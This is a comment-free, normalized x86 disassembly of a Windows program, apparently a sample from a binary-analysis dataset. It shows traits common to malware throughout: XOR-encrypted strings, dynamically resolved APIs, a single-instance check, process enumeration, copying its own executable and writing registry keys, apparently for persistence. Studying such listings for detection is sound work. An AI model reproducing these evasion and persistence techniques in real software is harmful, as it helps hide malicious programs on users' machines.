lea edi [ esp + 0x14d ]
mov [ esp + 0x14c ] bl
[ edi ]
mov [ esp + 0x2c ] bl
lea edi [ esp + 0x2d ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov esi 0x103
push esi
stosd [ edi ]
lea eax [ esp + 0x17d ]
push ebx
push eax
mov [ esp + 0x184 ] bl
call sub_2007940
add esp 0xc
push esi
lea eax [ esp + 0x495 ]
push ebx
push eax
mov [ esp + 0x49c ] bl
call sub_2007940
add esp 0xc
push esi
lea eax [ esp + 0x45 ]
push ebx
push eax
mov [ esp + 0x4c ] bl
call sub_2007940
add esp 0xc
push esi
lea eax [ esp + 0x285 ]
push ebx
push eax
mov [ esp + 0x28c ] bl
call sub_2007940
add esp 0xc
mov [ esp + 0x10 ] ebx
mov [ esp + 0xc ] ebx
mov [ esp + 0x24 ] ebx
call sub_200f1d4
test eax eax
jne r-xdata
xor eax eax
call sub_200f272
test eax eax
je r-xdata
push ebx
call sub_200291b
pop ecx
push eax
call sub_2001e8d
mov esi [ ebp + 0x10 ]
pop ecx
cmp esi ebx
je r-xdata
mov [ esp + 0x40 ] bl
mov eax esi
lea edx [ eax + 0x1 ]
mov edi 0x104
cmp esi ebx
je r-xdata
call sub_200f8b4
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
push edi
lea eax [ esp + 0x59d ]
push ebx
push eax
mov [ esp + 0x5a4 ] bl
call sub_2007940
add esp 0xc
push edi
lea eax [ esp + 0x6a5 ]
push ebx
push eax
mov [ esp + 0x6ac ] bl
call sub_2007940
add esp 0xc
lea eax [ esp + 0x6a0 ]
push r--data
push eax
call sub_2010397
lea eax [ esp + 0x5a0 ]
push r--data
push eax
call sub_2010397
add esp 0x10
lea eax [ esp + 0x6a0 ]
push eax
call [ GetModuleHandleA@IAT ]
lea ecx [ esp + 0x598 ]
push ecx
push eax
call [ GetProcAddress@IAT ]
mov esi eax
lea eax [ esp + 0x40 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
lea eax [ esp + 0x40 ]
push eax
push ebx
push ebx
call esi
mov [ esp + 0xc ] eax
cmp eax ebx
je r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
lea edx [ esp + 0x40 ]
mov eax esi
sub edx esi
push edi
lea eax [ esp + 0x17c ]
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
jmp r-xdata
lea ebx [ esp + 0x178 ]
call sub_20013e0
lea edx [ esp + 0x490 ]
lea eax [ esp + 0x40 ]
push rw-data
push eax
call sub_2010397
lea eax [ esp + 0x48 ]
push eax
call sub_20109d0
add esp 0xc
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x40 ]
push rw-data
push eax
call sub_2010397
lea eax [ esp + 0x48 ]
push eax
call sub_20109d0
add esp 0xc
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x40 ]
push rw-data
push eax
call sub_2010397
lea eax [ esp + 0x48 ]
push eax
call sub_20109d0
add esp 0xc
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x40 ]
push rw-data
push eax
call sub_2010397
lea eax [ esp + 0x48 ]
push eax
call sub_20109d0
add esp 0xc
mov [ esp + 0x28 ] eax
lea eax [ esp + 0x40 ]
push rw-data
push eax
call sub_2010397
lea eax [ esp + 0x48 ]
push eax
call sub_20109d0
add esp 0xc
mov [ esp + 0x20 ] eax
lea eax [ esp + 0x40 ]
push rw-data
push eax
call sub_2010397
lea eax [ esp + 0x48 ]
push eax
call sub_20109d0
add esp 0xc
mov edi eax
lea eax [ esp + 0x40 ]
push rw-data
push eax
call sub_2010397
lea eax [ esp + 0x48 ]
push eax
call sub_20109d0
add esp 0xc
lea eax [ esp + 0x40 ]
push rw-data
push eax
call sub_2010397
lea eax [ esp + 0x48 ]
push eax
call sub_20109d0
add esp 0xc
mov [ esp + 0x1c ] eax
cmp [ esp + 0x20 ] ebx
jne r-xdata
push [ esp + 0xc ]
call [ CloseHandle@IAT ]
lea eax [ esp + 0x40 ]
push r--data
push eax
call sub_2010397
lea eax [ esp + 0x48 ]
push eax
push esi
call sub_20015e1
add esp 0x10
test eax eax
je r-xdata
call sub_200f637
test eax eax
je r-xdata
mov cl [ eax ]
inc eax
mov [ edx ] cl
inc edx
test cl cl
jne r-xdata
xor edi edi
cmp [ esp + 0x10 ] edi
je r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_200f75c
pop ecx
push [ ebp + 0x14 ]
call sub_200f6bd
pop ecx
test eax eax
je r-xdata
cmp [ esp + 0x18 ] ebx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
lea edx [ esp + 0x178 ]
mov eax esi
sub edx esi
lea eax [ esp + 0x178 ]
push r--data
push eax
call sub_2001bb9
mov esi eax
pop ecx
pop ecx
cmp esi edi
je r-xdata
cmp [ esp + 0x24 ] edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push ebx
push ebx
push sub_200f7de
push ebx
push ebx
call [ CreateThread@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp edi ebx
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
xor eax eax
inc eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x24 ] eax
jmp r-xdata
push [ esp + 0xc ]
call [ CloseHandle@IAT ]
push 0x2
push edi
push esi
call sub_2002896
add esp 0xc
push esi
call sub_200279e
pop ecx
push edi
push edi
push esi
mov ebx eax
call sub_2002896
add esp 0xc
push ebx
call sub_200178d
pop ecx
mov [ esp + 0x1c ] eax
cmp eax edi
jne r-xdata
call sub_200f323
movzx eax ax
mov [ esp + 0x14 ] eax
mov [ esp + 0x14 ] 0x1
jmp r-xdata
lea eax [ esp + 0x40 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
push ebx
lea eax [ esp + 0x44 ]
push eax
push ebx
push ebx
call [ MessageBoxA@IAT ]
push 0x64
call [ Sleep@IAT ]
push 0xffffffff
push esi
call [ TerminateThread@IAT ]
cmp [ esp + 0x18 ] ebx
jne r-xdata
lea eax [ esp + 0x40 ]
push r--data
push eax
call sub_2010397
lea eax [ esp + 0x48 ]
push eax
lea eax [ esp + 0x184 ]
push eax
lea eax [ esp + 0x4a0 ]
push eax
call sub_2011864
add esp 0x14
test eax eax
jne r-xdata
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x20 ] ebx
cmp [ esp + 0x24 ] ebx
jne r-xdata
push esi
push ebx
push 0x1
push eax
call sub_2001e70
add esp 0x10
cmp eax ebx
jne r-xdata
push [ esp + 0xc ]
call [ CloseHandle@IAT ]
push esi
call sub_2002585
pop ecx
jmp r-xdata
lea eax [ esp + 0x14c ]
push 0x0
push eax
lea ebx [ esp + 0x34 ]
mov [ esp + 0x154 ] 0x0
call sub_2011db2
sub esp 0x770
mov edi esp
mov eax ebx
push eax
lea eax [ esp + 0x8c8 ]
mov ecx 0x1de
lea esi [ esp + 0xf24 ]
push eax
[ edi ] [ esi ]
call sub_2012389
add esp 0x780
test ax ax
jl r-xdata
lea eax [ esp + 0x178 ]
lea ebx [ esp + 0x7a8 ]
call sub_2010533
sub esp 0x778
mov ecx 0x1de
mov esi ebx
mov edi esp
[ edi ] [ esi ]
call sub_20129ba
add esp 0x778
cmp [ esp + 0x14 ] 0x1
jne r-xdata
mov [ esp + 0x10 ] ebx
cmp [ esp + 0x10 ] ebx
jne r-xdata
push esi
call sub_2002585
mov ebx [ ExpandEnvironmentStringsA@IAT ]
pop ecx
cmp [ esp + 0x20 ] edi
je r-xdata
lea eax [ esp + 0x40 ]
push rw-data
push eax
call sub_2010397
lea eax [ esp + 0x48 ]
push eax
call sub_20109d0
add esp 0xc
test eax eax
jne r-xdata
lea eax [ esp + 0x178 ]
push eax
call sub_2011929
pop ecx
jmp r-xdata
lea eax [ esp + 0x178 ]
push eax
call sub_2011929
pop ecx
jmp r-xdata
cmp [ esp + 0x28 ] ebx
jne r-xdata
cmp [ esp + 0x14 ] edi
jne r-xdata
lea eax [ esp + 0x280 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
push 0x104
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x288 ]
push eax
call ebx
jmp r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
cmp [ esp + 0x18 ] eax
jne r-xdata
cmp [ esp + 0x14 ] ebx
jne r-xdata
mov edi 0x104
push edi
lea eax [ esp + 0x38d ]
push 0x0
push eax
mov [ esp + 0x394 ] 0x0
call sub_2007940
add esp 0xc
lea eax [ esp + 0x40 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
lea esi [ edi + 0x1 ]
push esi
lea eax [ esp + 0x38c ]
push eax
lea eax [ esp + 0x48 ]
push eax
call ebx
test eax eax
jbe r-xdata
cmp [ esp + 0x18 ] edi
jne r-xdata
xor esi esi
lea eax [ esp + 0x40 ]
push r--data
push eax
call sub_2010397
lea eax [ esp + 0x48 ]
push eax
lea eax [ esp + 0x184 ]
push eax
lea eax [ esp + 0x4a0 ]
push eax
call sub_2011864
add esp 0x14
jmp r-xdata
cmp [ esp + 0x20 ] ebx
jne r-xdata
lea eax [ esp + 0x40 ]
push eax
call sub_2010b3d
pop ecx
lea eax [ esp + 0x40 ]
push 0x5c
push eax
call sub_2002110
pop ecx
pop ecx
test eax eax
je r-xdata
lea eax [ esp + 0x40 ]
push eax
call sub_2010b3d
pop ecx
jmp r-xdata
push 0xa
call [ Sleep@IAT ]
inc esi
lea eax [ esp + 0x280 ]
cmp esi 0x1
jne r-xdata
mov [ esp + 0x10 ] 0x1
cmp [ esp + 0x1c ] ebx
je r-xdata
inc eax
push eax
lea eax [ esp + 0x38c ]
push esi
push eax
call sub_200249a
add esp 0xc
lea eax [ esp + 0x388 ]
call sub_20013c0
test eax eax
jne r-xdata
push r--data
push r--data
jmp r-xdata
call sub_20117ba
test eax eax
je r-xdata
lea eax [ esp + 0x388 ]
push eax
lea eax [ esp + 0x44 ]
push edi
push eax
call sub_2001ec1
add esp 0xc
push eax
lea eax [ esp + 0x38c ]
push eax
lea eax [ esp + 0x48 ]
push eax
call [ CopyFileA@IAT ]
test eax eax
je r-xdata
lea eax [ esp + 0x178 ]
push eax
push [ esp + 0x20 ]
lea eax [ esp + 0x48 ]
push eax
call sub_2010c94
add esp 0xc
test eax eax
jne r-xdata
push eax
call sub_2010397
pop ecx
pop ecx
push 0x104
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x288 ]
push eax
call ebx
cmp esi 0x3
jl r-xdata
sub_20101f5
push ebp
mov ebp esp
sub esp 0x18
push edi
xor eax eax
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x18 ] 0x0
lea edi [ ebp - 0x17 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jne r-xdata
push ebx
push esi
lea ecx [ ebp - 0x17 ]
lea esi [ ebp - 0x18 ]
sub esi edx
mov edi ecx
push 0x4
lea eax [ edx + 0x2 ]
sub edi edx
pop edx
mov [ ebp - 0x4 ] edx
or eax 0xffffffff
jmp r-xdata
mov bl [ eax - 0x2 ]
mov [ ecx - 0x1 ] bl
mov bl [ eax - 0x1 ]
mov [ ecx ] bl
mov bl [ eax ]
mov [ esi + eax ] bl
mov bl [ eax + 0x1 ]
mov [ edi + eax ] bl
add ecx edx
add eax edx
dec [ ebp - 0x4 ]
jne r-xdata
sub [ ebp + 0xc ] 0x10
xor eax eax
cmp [ ebp + 0xc ] eax
jle r-xdata
pop edi
leave
retn
pop esi
pop ebx
cmp eax [ ebp + 0xc ]
je r-xdata
mov esi [ ebp + 0x8 ]
add esi eax
mov ecx edx
lea edi [ ebp - 0x18 ]
xor ebx ebx
[ esi ] [ edi ]
je r-xdata
add eax 0x10
inc eax
cmp eax [ ebp + 0xc ]
jl r-xdata
sub_201027b
test esi esi
jne r-xdata
mov eax esi
lea ecx [ eax + 0x1 ]
xor eax eax
retn
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
movzx ecx ax
xor eax eax
test cx cx
je r-xdata
retn
xor edx edx
cmp ax cx
jge r-xdata
xor eax eax
inc eax
movsx eax dx
mov al [ eax + esi ]
cmp al 0x30
jl r-xdata
cmp al 0x41
jl r-xdata
cmp al 0x39
jle r-xdata
sub al 0x61
cmp al 0x5
ja r-xdata
cmp al 0x46
jle r-xdata
inc edx
cmp dx cx
jl r-xdata
sub_20102c7
push ebp
mov ebp esp
push ecx
push ecx
push edi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push [ esi ]
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x100
call [ RegQueryValueExA@IAT ]
push [ esi ]
mov edi eax
call [ RegCloseKey@IAT ]
xor eax eax
test edi edi
sete al
pop edi
leave
retn
sub_2010306
movzx eax al
xor eax [ esp + 0x4 ]
push 0x8
pop ecx
mov edx eax
and edx 0x1
imul edx edx 0xedb88320
shr eax 0x1
xor eax edx
dec ecx
jne r-xdata
not eax
retn
sub_2010325
push ebp
lea ebp [ esp - 0x6c ]
sub esp 0x84
push esi
push edi
push 0x7f
lea eax [ ebp - 0x17 ]
push 0x0
push eax
call sub_2007940
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor eax eax
add esp 0xc
movsb [ edi ] [ esi ]
mov [ ebp + 0x68 ] eax
cmp [ ebp + 0x7c ] eax
jbe r-xdata
pop edi
pop esi
add ebp 0x6c
leave
retn
mov esi [ ebp + 0x78 ]
mov edi [ ebp + 0x74 ]
sub edi esi
push ebx
mov eax [ ebp + 0x68 ]
inc eax
mov [ edi + esi ] cl
inc esi
mov [ ebp + 0x68 ] eax
cmp eax [ ebp + 0x7c ]
jb r-xdata
xor edx edx
push 0xa
pop ebx
div ebx
movzx eax cl
mov dl [ ebp + edx - 0x18 ]
movsx ebx dl
cmp eax ebx
je r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
pop ebx
xor cl dl
sub_2010397
push ebp
lea ebp [ esp - 0x70 ]
sub esp 0x88
push esi
push edi
push 0x7f
lea eax [ ebp - 0x17 ]
push 0x0
push eax
call sub_2007940
mov eax [ ebp + 0x7c ]
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0xc
movsb [ edi ] [ esi ]
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
mov [ ebp + 0x6c ] eax
xor eax eax
cmp [ ebp + 0x6c ] eax
mov [ ebp + 0x68 ] eax
jle r-xdata
mov ecx [ ebp + 0x78 ]
pop edi
mov [ eax + ecx ] 0x0
pop esi
add ebp 0x70
leave
retn
mov esi [ ebp + 0x7c ]
mov edi [ ebp + 0x78 ]
sub edi esi
push ebx
mov eax [ ebp + 0x68 ]
inc eax
mov [ edi + esi ] cl
inc esi
cmp eax [ ebp + 0x6c ]
mov [ ebp + 0x68 ] eax
jl r-xdata
xor cl dl
push 0xa
cdq
pop ebx
idiv ebx
mov cl [ esi ]
mov dl [ ebp + edx - 0x18 ]
cmp cl dl
je r-xdata
pop ebx
sub_2010417
push ebp
mov ebp esp
sub esp 0x88c
push ebx
push esi
mov esi eax
push edi
mov ebx rw-data
test esi esi
je r-xdata
push 0x104
lea eax [ ebp - 0x110 ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
lea edi [ ebp - 0x110 ]
dec edi
lea edx [ eax + 0x1 ]
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
lea eax [ ebp - 0x110 ]
movsw [ edi ] [ esi ]
call sub_20013c0
test eax eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
push 0x778
lea eax [ ebp - 0x888 ]
push ebx
push eax
call sub_2010325
add esp 0xc
xor eax eax
cmp [ ebp - 0x7c8 ] al
pop edi
pop esi
setne al
pop ebx
leave
retn
lea eax [ ebp - 0x110 ]
push r--data
push eax
call sub_2001bb9
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax esi
sub edx esi
push esi
push 0x778
push 0x1
push ebx
call sub_2001e70
push esi
call sub_2002585
add esp 0x14
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x110 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
lea eax [ ebp - 0x110 ]
movsw [ edi ] [ esi ]
call sub_20013c0
test eax eax
je r-xdata
lea eax [ ebp - 0x110 ]
push r--data
push eax
call sub_2001bb9
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push 0x778
push 0x1
push ebx
call sub_2001e70
push esi
call sub_2002585
add esp 0x14
sub_2010533
push ebp
mov ebp esp
sub esp 0x888
push esi
lea edx [ ebp - 0x110 ]
push edi
sub edx eax
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x110 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
lea eax [ ebp - 0x110 ]
movsw [ edi ] [ esi ]
call sub_20013c0
mov edi 0x778
mov esi rw-data
test eax eax
je r-xdata
push edi
lea eax [ ebp - 0x888 ]
push esi
push eax
call sub_2010325
lea eax [ ebp - 0x888 ]
push eax
push ebx
call sub_2010397
lea eax [ ebp - 0x868 ]
push eax
lea eax [ ebx + 0x20 ]
push eax
call sub_2010397
lea eax [ ebp - 0x848 ]
push eax
lea eax [ ebx + 0x40 ]
push eax
call sub_2010397
lea eax [ ebp - 0x828 ]
push eax
lea eax [ ebx + 0x60 ]
push eax
call sub_2010397
lea eax [ ebp - 0x808 ]
push eax
lea eax [ ebx + 0x80 ]
push eax
call sub_2010397
lea eax [ ebp - 0x7e8 ]
push eax
lea eax [ ebx + 0xa0 ]
push eax
call sub_2010397
mov al [ ebp - 0x7c8 ]
add esp 0x3c
lea edi [ ebx + 0xc8 ]
mov ecx 0x1ac
lea esi [ ebp - 0x7c0 ]
[ edi ] [ esi ]
pop edi
mov [ ebx + 0xc0 ] al
pop esi
leave
retn
lea eax [ ebp - 0x110 ]
push r--data
push eax
call sub_2001bb9
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
push eax
push edi
push 0x1
push esi
call sub_2001e70
push [ ebp - 0x4 ]
call sub_2002585
add esp 0x14
sub_2010645
push ebp
mov ebp esp
sub esp 0x114
push ebx
push esi
push edi
xor ebx ebx
push 0x103
lea eax [ ebp - 0x113 ]
push ebx
push eax
mov [ ebp - 0x114 ] bl
call sub_2007940
lea eax [ ebp - 0x114 ]
push r--data
push eax
call sub_2010397
add esp 0x14
lea eax [ ebp - 0x114 ]
push eax
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
xor eax eax
lea eax [ ebp - 0x114 ]
push r--data
push eax
call sub_2010397
mov esi [ GetProcAddress@IAT ]
pop ecx
pop ecx
lea eax [ ebp - 0x114 ]
push eax
push edi
call esi
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x114 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
lea eax [ ebp - 0x114 ]
push eax
push edi
call esi
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x8 ] ebx
je r-xdata
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov edi 0xf003f
push edi
push ebx
push [ ebp + 0x8 ]
mov esi 0x80000001
push esi
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
lea esi [ eax + 0x1 ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push edi
push ebx
push r--data
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0xc ] 0x1
push esi
call [ ebp - 0x8 ]
test eax eax
jne r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
push eax
push [ ebp + 0x10 ]
push 0x1
push ebx
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
call [ ebp - 0x10 ]
push [ ebp - 0x4 ]
mov esi eax
call [ RegCloseKey@IAT ]
xor eax eax
cmp esi ebx
sete al
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_2010760
push ebp
mov ebp esp
sub esp 0x398
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x8 ] ebx
je r-xdata
xor eax eax
mov esi 0x104
push esi
lea eax [ ebp - 0x393 ]
push ebx
push eax
mov [ ebp - 0x394 ] bl
call sub_2007940
push esi
lea eax [ ebp - 0x28b ]
push ebx
push eax
mov [ ebp - 0x28c ] bl
call sub_2007940
lea eax [ ebp - 0x394 ]
push r--data
push eax
call sub_2010397
lea eax [ ebp - 0x28c ]
push r--data
push eax
call sub_2010397
mov esi [ GetModuleHandleA@IAT ]
add esp 0x28
lea eax [ ebp - 0x28c ]
push eax
lea eax [ ebp - 0x394 ]
push eax
call esi
mov edi [ GetProcAddress@IAT ]
push eax
call edi
mov [ ebp - 0x18 ] eax
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x28c ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
lea eax [ ebp - 0x28c ]
push eax
lea eax [ ebp - 0x394 ]
push eax
call esi
push eax
call edi
mov [ ebp - 0x14 ] eax
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x8 ]
push ebx
push 0x2
mov [ eax ] bl
call CreateToolhelp32Snapshot
mov [ ebp - 0x10 ] eax
cmp eax 0xffffffff
je r-xdata
push 0x3f
lea eax [ ebp - 0x5b ]
push ebx
push eax
mov [ ebp - 0x5c ] bl
call sub_2007940
xor eax eax
mov [ ebp - 0xc ] bl
lea edi [ ebp - 0xb ]
stosd [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x5c ]
push r--data
push eax
call sub_2010397
add esp 0x14
lea eax [ ebp - 0x184 ]
push eax
push [ ebp - 0x10 ]
mov [ ebp - 0x184 ] 0x128
call [ ebp - 0x18 ]
jmp r-xdata
test eax eax
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0x160 ]
push eax
call sub_20015e1
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x10 ]
call [ CloseHandle@IAT ]
xor eax eax
inc eax
jmp r-xdata
lea eax [ ebp - 0x184 ]
push eax
push [ ebp - 0x10 ]
mov [ ebp - 0x184 ] 0x128
call [ ebp - 0x14 ]
mov al [ ebp - 0x160 ]
mov [ ebp - 0xa ] al
mov al [ ebp - 0x15f ]
mov [ ebp - 0x8 ] al
mov al [ ebp - 0x15e ]
mov [ ebp - 0xb ] al
mov al [ ebp - 0x15d ]
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x15c ]
mov [ ebp - 0xc ] al
lea eax [ ebp - 0xc ]
mov edx eax
pop edi
pop esi
pop ebx
leave
retn
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
mov edi [ ebp + 0x8 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
sub_2010924
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ eax ]
mov eax [ ebp + 0xc ]
mov esi [ eax ]
mov ebx [ esi + edi - 0x6 ]
lea eax [ esi - 0x6 ]
cmp eax ebx
jae r-xdata
push ebx
call sub_200178d
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
sub esi ebx
push ebx
lea ecx [ esi + edi - 0x6 ]
push ecx
push eax
call sub_2010325
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_20016b0
mov eax ebx
imul eax eax 0x6
push eax
mov [ ebp - 0x8 ] eax
call sub_200178d
mov edi eax
add esp 0x14
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push ebx
push [ ebp - 0x4 ]
lea esi [ ebp - 0x8 ]
push edi
call sub_2001000
add esp 0xc
push [ ebp - 0x4 ]
test eax eax
jge r-xdata
push [ ebp - 0x4 ]
call sub_20016b0
call sub_20016b0
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
mov eax [ ebp - 0x8 ]
pop ecx
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
call sub_20016b0
push edi
call sub_20016b0
pop ecx
jmp r-xdata
pop ecx
jmp r-xdata
sub_20109d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub esp 0x348
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
xor eax eax
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
mov esi 0x104
push esi
lea eax [ ebp - 0x21b ]
push ebx
push eax
mov [ ebp - 0x21c ] bl
call sub_2007940
push esi
lea eax [ ebp - 0x113 ]
push ebx
push eax
mov [ ebp - 0x114 ] bl
call sub_2007940
lea eax [ ebp - 0x21c ]
push r--data
push eax
call sub_2010397
lea eax [ ebp - 0x114 ]
push r--data
push eax
call sub_2010397
mov esi [ GetModuleHandleA@IAT ]
add esp 0x28
lea eax [ ebp - 0x114 ]
push eax
lea eax [ ebp - 0x21c ]
push eax
call esi
mov edi [ GetProcAddress@IAT ]
push eax
call edi
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x114 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
lea eax [ ebp - 0x114 ]
push eax
lea eax [ ebp - 0x21c ]
push eax
call esi
push eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push ebx
push 0x2
call CreateToolhelp32Snapshot
mov edi eax
cmp edi 0xffffffff
je r-xdata
push r--data
push [ ebp + 0x8 ]
call sub_2001a34
pop ecx
pop ecx
mov [ ebp + 0x8 ] eax
cmp eax ebx
je r-xdata
push edi
call [ CloseHandle@IAT ]
mov esi 0x128
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x320 ]
push eax
call sub_20015e1
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push ebx
call sub_2001a34
pop ecx
pop ecx
mov [ ebp + 0x8 ] eax
cmp eax ebx
jne r-xdata
push edi
call [ CloseHandle@IAT ]
xor eax eax
inc eax
jmp r-xdata
lea eax [ ebp - 0x344 ]
push eax
push edi
mov [ ebp - 0x344 ] esi
call [ ebp - 0x8 ]
lea eax [ ebp - 0x344 ]
push eax
push edi
mov [ ebp - 0x344 ] esi
call [ ebp - 0xc ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_2010b3d
push ebp
mov ebp esp
sub esp 0x208
push ebx
push esi
xor ebx ebx
push 0x103
lea eax [ ebp - 0x107 ]
push ebx
push eax
mov [ ebp - 0x108 ] bl
call sub_2007940
lea eax [ ebp - 0x108 ]
push r--data
push eax
call sub_2010397
add esp 0x14
xor eax eax
mov cl [ ebp + eax - 0x108 ]
mov [ ebp + eax - 0x208 ] cl
inc eax
cmp cl bl
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x20019
push ebx
lea eax [ ebp - 0x208 ]
push eax
push 0x80000000
mov [ ebp - 0x104 ] bl
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x104 ]
push eax
lea esi [ ebp - 0x4 ]
call sub_20102c7
pop ecx
cmp eax ebx
jne r-xdata
pop esi
pop ebx
leave
retn
xor eax eax
cmp [ ebp - 0x104 ] 0x22
jne r-xdata
mov cl [ ebp + eax - 0x104 ]
mov [ ebp + eax - 0x208 ] cl
inc eax
cmp cl bl
jne r-xdata
mov cl [ ebp + eax - 0x103 ]
mov [ ebp + eax - 0x208 ] cl
inc eax
cmp cl bl
jne r-xdata
push r--data
push r--data
jmp r-xdata
mov edx [ ebp + 0x8 ]
lea eax [ ebp - 0x208 ]
mov ecx eax
sub edx ecx
lea esi [ ebp - 0x104 ]
mov ecx eax
sub esi eax
lea eax [ ebp - 0x208 ]
push eax
call sub_2001a34
pop ecx
pop ecx
lea eax [ ebp - 0x208 ]
push r--data
push eax
call sub_2001860
pop ecx
pop ecx
cmp eax ebx
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
xor eax eax
mov dl [ ecx ]
mov [ esi + ecx ] dl
inc ecx
cmp dl bl
jne r-xdata
mov [ eax ] bl
lea eax [ ebp - 0xfe ]
mov edx eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
push edi
lea edi [ ebp - 0x208 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
sub_2010c94
push ebp
mov ebp esp
sub esp 0x798
push ebx
push esi
